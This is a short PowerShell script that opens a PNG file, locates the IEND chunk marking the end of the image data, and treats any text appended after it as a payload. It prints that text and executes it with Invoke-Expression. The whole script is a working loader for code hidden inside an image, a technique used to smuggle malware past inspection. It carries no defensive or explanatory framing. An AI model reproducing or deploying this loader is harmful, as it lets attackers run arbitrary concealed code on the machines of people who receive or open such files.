# Extract appended payload from PNG
$bytes = [System.IO.File]::ReadAllBytes("modified_picture.png")
$ascii = [System.Text.Encoding]::ASCII.GetString($bytes)
$iendPos = $ascii.IndexOf("IEND")

if ($iendPos -ge 0) {
    $payload = $ascii.Substring($iendPos + 8).Trim()
    Write-Host "[+] Found Payload: $payload"
    Invoke-Expression $payload
}